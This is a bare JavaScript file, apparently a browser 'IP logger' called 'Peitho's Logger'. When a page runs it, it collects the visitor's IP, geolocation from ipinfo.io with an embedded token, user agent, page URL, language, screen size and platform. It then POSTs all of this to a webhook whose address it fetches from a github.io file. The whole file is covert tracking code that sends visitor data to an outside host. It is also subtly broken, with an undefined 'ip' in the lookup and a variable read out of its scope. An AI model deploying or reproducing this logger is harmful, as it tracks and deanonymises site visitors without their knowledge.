async function get_ip() {
	let req = await fetch('https://ipv4.icanhazip.com');
	let res = await req.text();
	return res;
}
async function url() {
	let req = await fetch('https://julie420.github.io/resources/url.txt');
	let res = await req.text();
	let hook = res;
	return res;
}

async function loc() {
	let req = await fetch(`https://ipinfo.io/${ip}/json?token=505bd0ad097007`);
	let res = await req.text();
	return res;
}

get_ip().then((ip) => {
	loc().then((info) => {
		let useragent = navigator.userAgent;

		let height = window.screen.height;
		let width = window.screen.width;

		let gpu = navigator.hardwareConcurrency;

		let cookies = navigator.cookieEnabled;
		let name = navigator.product;
		let code = navigator.appCodeName;
		let lang = navigator.language;

		let os = navigator.platform;

		let refferer = window.location.href;

		url().then((hook) => {
			function sendMessage() {
				var request = new XMLHttpRequest();
				if (localStorage.ip == undefined) {
					localStorage.setItem('ip', ip);
				} else if (localStorage.ip != undefined) {
					let localstorageip = localStorage.ip;
				}

				request.open('POST', hook);

				request.setRequestHeader('Content-type', 'application/json');

				var params = {
					username: "Peitho's Logger",
					avatar_url: 'https://doggo.ninja/TsY1SP.jpg',
					color: '',
					embeds: [
						{
							color: '19474160',
							title: 'Logged a user!',
							description: `**IP Address:**
${ip}
**LocalStorage IP Address:**
${localstorageip}
------------------------------------------------------
**Browser data:**

Useragent: 
${useragent}

Refferer: ${refferer}
Browser language: ${lang}
Cookies enabled: ${cookies}
Browser engine: ${name}
Browser code: ${code}
------------------------------------------------------
**Screen details:**
Size: ${width} x ${height}
------------------------------------------------------
**Specs:**
Operating system: ${os} 

*GPU:*
Core count: ${gpu}
------------------------------------------------------
**IP Info:**
\`\`\`
${info}
\`\`\`
------------------------------------------------------`,
						},
					],
				};

				request.send(JSON.stringify(params));
			}
			sendMessage();
		});
	});
});
